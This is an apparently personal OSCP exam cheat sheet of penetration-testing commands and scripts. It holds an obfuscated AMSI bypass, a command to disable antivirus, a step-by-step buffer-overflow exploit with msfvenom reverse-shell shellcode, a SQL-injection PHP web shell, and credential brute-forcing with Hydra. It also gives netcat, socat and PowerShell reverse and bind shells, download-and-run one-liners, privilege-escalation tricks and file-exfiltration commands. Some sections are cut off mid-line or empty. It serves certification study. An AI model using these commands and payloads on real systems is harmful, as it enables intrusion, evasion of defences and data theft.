# OSCP_cheatsheet

# Summary
* [General](#General)
* [Buffer Overflow](#Buffer-Overflow)
* [Enumeration](#Enumeration)
   * [Enumeration Tips](#Enumeration-tips)
   * [Discovery](#Discovery)
   * [Services](#Services)
        * [Most common ports](#Most-common-ports)
        * [Port Scanning Nmap](#port-scanning-Nmap)
        * [Tips & Tricks](#Tips-and-Tricks)
   * [Web-applications](#Web-applications)
* [Exploitation](#Exploitation)
   * [Web application](#Exploitation-Web-application)
   * [FTP](#FTP)
   * [Credential bruteforcing](#Credential-bruteforcing)
   * [SMB and NETBIOS](#SMB-and-NETBIOS)
   * [NFS Shares](#NFS-Shares)
   * [All the Shells](#Shells)
* [Post Exploitation](#Post-Exploitation)
   * [Local privilege escalation](#Local-privilege-escalation)
        * [Windows](#Windows)
        * [Linux](#Linux)
   * [Lateral Movement](#Lateral-Movement)
    
# General
#### Python error
When receiving the error “/usr/bin/env: ‘python\r’: No such file or directory when running an python exploit.
1.	Open the python file in vim
2.	Use the command ```:set ff=unix```
3.	Save the file. ```:wq```

#### SSH key files
ssh key files needs to be permission 600
```
sudo chmod 600 <FILE>
```

## Powershell
#### Powershell flags
- ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
-	```-w hidden```: to avoid creating a window on the user’s desktop
-	```-e```: (```-EncodedCommand```) use base64 encoding

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disbale AV (Requires local admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell execution policy
#### Get execution policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

#### Bypass execution policy flag
```
-ExecutionPolicy Bypass
```

#### Disable execution policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

#### EXAMPLE COMMANDO
```
<COMMANDO>
```
 
# Buffer overflow
To find and exploit a buffer overflow the following steps should be executed:
   1. **Spiking:** Find the vulnerable parameter
   2. **Fuzzing:** Get the amount of bytes the program crashes
   3. **Find the offset:** Get the amount of bytes to write to the EIP
   4. **Overwriting the EIP**
   5. **Find bad characters:** Run all hex characters through the program
   6. **Finding the right module:** Look for a ddl without memory protections
   7. **Generating shellcode:** To get a reverse shell or to run calc
   
Make sure you got immunity debugger + mona.py installed
   
#### Spiking
1. Take the commands/options/parameters one at a time and send a bunch of data to see if it crashes
2. Use `generic_send_tcp <HOST> <PORT> <SPIKE SCRIPT> 0 0` to send a spike script
```
#EXAMPLE SPIKE SCRIPT
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

#### Fuzzing
1. Get the amount of bytes it crashes the program, the following fuzzing script could be used:
- Set the IP and PORT
- Set the prefix if required

```
import socket, time, sys

ip = "<IP>"
port = <PORT>
prefix = ""
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(prefix + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

#### Find the offset
1.	Create a offset pattern with the amount of bytes +400 the program crashed.

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>```

or

```
!mona config -set workingfolder C:\ImmunityLogs\%p
!mona pc <length>
```

2.	Create a new script named exploit.py and set the offset pattern in the variable ```payload```

```
import socket

ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

3.	Run the following in Mona and skip 4 (If it doesn't work do step 4 tho as a workaround)
```
!mona findmsp -distance <LENGTH OF GENERATED STRING>
#Check for output: EIP contains normal pattern : ... (offset XXXX)
```

4. Get the amount of offset bytes.

```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```

```!mona po <EIP VALUE>```

5. Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

#### Overwriting the EIP
1. Edit the script, remove the offset variable. Then change the buffer to overwrite the buffer with 4 B's

```
buffer = "A" * <OFFSET BYTES> + "B" * 4
```

2. Execute the script and check if the EIP is overwritten with 4 B's (42424242)

#### Find bad characters
1. Get a list of bad characters from https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ or https://github.com/cytopia/badchars
2. Edit the script and change the payload to send the bad characters and run the following in Immunity Debugger ```!mona bytearray -b "\x00```

```
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * <OFFSET BYTES> + "B" * 4 + badchars
```

3. Run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```
A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string. The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. 

4. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well. Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
```
!mona bytearray -b "<BADCHARS>"
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
```

#### Finding the right module
There is two ways (need to find out which is the best/fastest)
1. Run the following command
```
!mona jmp -r esp -cpb "<BACHARS>"
```
This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).
2. Go to step 6 below

1. See all the module by executing `!mona modules` in the Immunity Debugger console.
2. Check all the protection settings (Rebase, SafeSEN, ASLR, NXCompat, OS dll)
3. Look for a vulnerable dll with all falses and write down the .dll
4. Find the upcode equivalant of a jump use `nasm_shell.rb`

```
JMP ESP 
output = \xff\xe4
```

5. Get the all the JMP ESP return adressess `!mona find -s "\xff\xe4" -m <.dll file>`
6. Write down all the JMP ESP return adresses
7. Edit the buffer variable in the script with a JMP ESP return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.

```
buffer = "A" * 2003 +  "<RETURN\ESP ADRESS>"
buffer = "A" * 2003 +  "\xaf\x11\x50\x62" #LITTLE ANDIAN EXAMPLE WITH ADRESS 625011af
```

8. Click on the blue arrow in Immunity Debugger and enter the return adress, hit F2 to mark it blue and set a break point. Check the EIP value. If the EIP value == return/ESP adress we control the EIP

#### Generating shellcode
1. Generate shellcode with msfvenom (reverse shell)

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<BADCHARS>"
```

2. Add a payload variable to the script in parenthese()
3. Add the payload to the end of the buffer and insert NOPS in-between the return adress and payload

```
payload = (
"\xba\x9f\x88\x46\xeb\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xc9\x86\xa4\x1e\x09\x7e\xaa"
"\xe1\xf1\x7f\xcb\x68\x14\x4e\xcb\x0f\x5d\xe1\xfb\x44\x33\x0e"
"\x77\x08\xa7\x85\xf5\x85\xc8\x2e\xb3\xf3\xe7\xaf\xe8\xc0\x66"
"\x2c\xf3\x14\x48\x0d\x3c\x69\x89\x4a\x21\x80\xdb\x03\x2d\x37"
"\xcb\x20\x7b\x84\x60\x7a\x6d\x8c\x95\xcb\x8c\xbd\x08\x47\xd7"
"\x1d\xab\x84\x63\x14\xb3\xc9\x4e\xee\x48\x39\x24\xf1\x98\x73"
"\xc5\x5e\xe5\xbb\x34\x9e\x22\x7b\xa7\xd5\x5a\x7f\x5a\xee\x99"
"\xfd\x80\x7b\x39\xa5\x43\xdb\xe5\x57\x87\xba\x6e\x5b\x6c\xc8"
"\x28\x78\x73\x1d\x43\x84\xf8\xa0\x83\x0c\xba\x86\x07\x54\x18"
"\xa6\x1e\x30\xcf\xd7\x40\x9b\xb0\x7d\x0b\x36\xa4\x0f\x56\x5f"
"\x09\x22\x68\x9f\x05\x35\x1b\xad\x8a\xed\xb3\x9d\x43\x28\x44"
"\xe1\x79\x8c\xda\x1c\x82\xed\xf3\xda\xd6\xbd\x6b\xca\x56\x56"
"\x6b\xf3\x82\xf9\x3b\x5b\x7d\xba\xeb\x1b\x2d\x52\xe1\x93\x12"
"\x42\x0a\x7e\x3b\xe9\xf1\xe9\x84\x46\xf9\x6e\x6c\x95\xf9\x71"
"\xd6\x10\x1f\x1b\x38\x75\x88\xb4\xa1\xdc\x42\x24\x2d\xcb\x2f"
"\x66\xa5\xf8\xd0\x29\x4e\x74\xc2\xde\xbe\xc3\xb8\x49\xc0\xf9"
"\xd4\x16\x53\x66\x24\x50\x48\x31\x73\x35\xbe\x48\x11\xab\x99"
"\xe2\x07\x36\x7f\xcc\x83\xed\xbc\xd3\x0a\x63\xf8\xf7\x1c\xbd"
"\x01\xbc\x48\x11\x54\x6a\x26\xd7\x0e\xdc\x90\x81\xfd\xb6\x74"
"\x57\xce\x08\x02\x58\x1b\xff\xea\xe9\xf2\x46\x15\xc5\x92\x4e"
"\x6e\x3b\x03\xb0\xa5\xff\x23\x53\x6f\x0a\xcc\xca\xfa\xb7\x91"
"\xec\xd1\xf4\xaf\x6e\xd3\x84\x4b\x6e\x96\x81\x10\x28\x4b\xf8"
"\x09\xdd\x6b\xaf\x2a\xf4")

buffer = "A" * 2003 + "<RETURN\ESP ADRESS>" + "\x90" * 32  + payload
```
 
# Enumeration
## Host Discovery
#### NMAP ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
Nmap is used for port scanning.
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA full_tcp_-<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA full_udp_-<TARGET> 
```

#### Nmap scan most common ports wiht no host discovery
```
nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep-<TARGET> 
nmap <TARGET> --top-ports 25 -oA portsweep_top25-<TARGET> 
```

#### Nmap scan all vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET> 
```

#### Usefull flags
```
-Pn No ping #use if host says down but you know its up)
-sn No port scan #use if you just want to scan a range to check if hosts are up.
```

### Enumeration Tips
#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

### Tool Nikto
Nikto is used for vulnerability scanning a web application.
```
nikto -host <URL> -output nikto-URL.txt
```

### Tools Directory fuzzing
Directory fuzzing is used to fuzz directories on a website.
#### Tool Dirb
Use the -R to disable recursive scanning
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Tool Gobuster
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Usefull flags Dirb
```
-p set op a proxy <IP:PORT>
-X Append each word with this extensions.
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### Shares SMB
#### Nmap enumerate SMB shares
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

#### SMBClient list shares
```
smbclient -L <IP>
smbclient -L <IP>  -U '<USER>'%'<PASS>'
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
smbget -R smb://<IP>/<SHARE>
```

### Shares RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```

# Exploitation
## Exploitation Web application
### General
When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
-	Does it initiate an HTTP or HTTPS connection?
-	Does it access a web application specific path or route?
-	Does the exploit leverage a pre-authentication vulnerability?
-	If not, how does the exploit authenticate to the web application?
-	How are the GET or POST requests crafted to trigger and exploit the vulnerability?
-	Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
-	Will oddities such as self-signed certificates disrupt the exploit?

### SQL Injection
- Use ‘ and “ to look for possible errors
- use # and -- for comments after the injection.
- If returning multiple rows gives errors use ```LIMIT 1``` in the query
- use ```ORDER BY``` to find the amount of columns. Increment it by 1 till no output is shown.
- use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
- use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.

### File upload
#### File upload intruder extensions list
```
/opt/SecLists/Discovery/Web-Content/web-extensions.txt
```

## FTP
- Check if login is allowed as anonymous:anonymous.

## Credential bruteforcing
#### Hydra FTP
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
```

#### Hydra SSH
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
```

#### Hydra HTTP login
Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOKIES FROM BURP AND SET ^USER^ AND ^PASS^>:<ERROR MESSAGE FAILED LOGIN>"

#EXAMPLE hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"

#EXAMPLE hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt 10.10.175.0 http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=u8hdjDohYmqfI8o0z7Cev4b1u0jLmv9dNA9NS95wDsZeMYw6zBFeyhiLx1QuOsZ%2FXV%2Fo%2BrCdXSC4Y7%2FueaRnmboaQQ9KZQWLME84zysowmYTAW8Kea1%2Bp7phoEwMiICbLwPPteDEYl7z6nobm8x1Mb2hMDiTpDJhracgmTh%2BJwP1Rqqt&__EVENTVALIDATION=QJmkftZnDEcQIPsstxYKnQBDsulZLsB0kmrbMa4BPzAc%2FMEDChrOmztni5OWBx83r2xGNndCAgw6wJ%2F%2FoAzYtZEcyRWC%2FaPyUR5iWSO0V8%2FIodobow1OxiuoD9uZVnVO8tcQZr3NWYjFcOVxYg5WAWvPyezvfcBk2oxUdZwsutPATiKB&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed'
```

## SMB and NETBIOS
NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)211 is required for backward compatibility and is often enabled together.

#### NBTSCAN
```
sudo nbtscan -r <IP RANGE>
```

#### Nmap SMB Script
```
/usr/share/nmap/scripts/smb*
```

## NFS Shares
Portmapper and RPCBind run on TCP port 111

#### Enumerations
```
rpcinfo irked.htb
nmap -sSUC -p111 <IP>
```

#### Mount shares
```
sudo mount -o nolock <IP>:/<SHARE> <MOUNT LOCATION>
```

#### Open file with no permission to file
If a file found which we want to access but don’t have permissions. Make a user with the same username and change the UUID, change to the user so we can access the file.
```
sudo adduser pwn
sudo vim /etc/passwd
```

## Shells
### Listeners
#### Netcat listener
```
sudo nc -nlvp <PORT>
```

#### Socat listener
```
sudo socat -d -d TCP4-LISTEN:<PORT> STDOUT
```

#### Meterpreter listener
```
msfconsole
use multi/handler
set payload <PAYLOAD>
run
```

#### Powercat listener
```
. ./powercat.ps1
powercat -l -v -p 10000
```

### Reverse shells
#### Netcat
```
nc -nv <IP> <PORT> -e /bin/bash
```

#### Socat
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

#### Powershell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -usebasicparsing);Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

#### Powercat
```
powercat -c <IP> -p <PORT> -e cmd.exe
```

### Bind shells
#### Netcat
```
nc -nlvp <PORT>
```

#### Powershell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<IP>',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
```

#### Powercat
```
powercat -l -p <PORT> -e cmd.exe
```

### Spawn TTY Shells
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
echo os.system('/bin/bash')
```

```
/bin/sh -i
```

```
perl —e 'exec "/bin/sh";'
```

```
perl: exec "/bin/sh";
```

```
ruby: exec "/bin/sh"
```

# Post Exploitation
## Local privilege escalation
Exploit binaries
- Linux https://gtfobins.github.io/
- Windows https://lolbas-project.github.io/

Static binaries
- https://github.com/andrew-d/static-binaries

### Windows
- Windows check if Windows Scheduler is running (```tasklist```)
  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
  - Check if we got write permissions

#### Powerup unqouted service path
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

- Check for something we can restart and generate payload:
- MSF venom generate exe
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o <NAME>.exe```
- Upload to host in the unqouted servicepath (if path is C:\Program Files\pro ftp) upload it as C:\Program Files\pro.exe
- Restart service in powershell. 
-   ```restart-service  <SERVICE>```

### Linux
#### Find suit bits
```
find / -perm -u=s -type f 2>/dev/null
```

If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
- echo /bin/bash > /tmp/curl
- chmod 777 /tmp/curl
- export PATH=/tmp:$PATH
- <path to binary>

#### Run SUID BIT
Use the following instead of just sudo <PROGRAM>
```
sudo -u root <PATH TO PROGRAM>
```

## File transfers
### Download files
#### Start webservers
```
sudo service apache2 start #files in /var/www/html
sudo python3 -m http.server <PORT> #files in current 
sudo python2 -m SimpleHTTPServer <PORT>
sudo php -S 0.0.0.0:<PORT>
sudo ruby -run -e httpd . -p <PORT>
sudo busybox httpd -f -p <PORT>
```

#### Download file from webserver
```
wget http://<IP>:<PORT>/<FILE>
```

#### Linux ftp
```
If installed use the ftp package
```

#### Windows ftp
Use native program with the -s parameter to use a input file for the commands
```
echo open <IP> 21> ftp.txt
echo USER <USER> >> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

#### VBS download files for Windows XP
Create vbs script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file
```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

#### Powershell download file
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
```
```
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
```

### Upload files
#### Netcat listener for file
```
nc -nlvp 4444 > <FILE>
```

#### Netcat send file
```
nc -nv 10.11.0.22 4444 <FILE>
```

#### Socat listener for file
```
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
```

#### Socat send file
```
socat TCP4:<IP>:<PORT> file:<FILE>,create
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

#### Upload Windows data through HTTP Post request
make /var/www/upload.php on kali
```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

#### Upload through tftp (over udp)
Install tftp on kali
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows client to send file
```
tftp -i 10.11.0.4 put important.docx
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

## Lateral movement
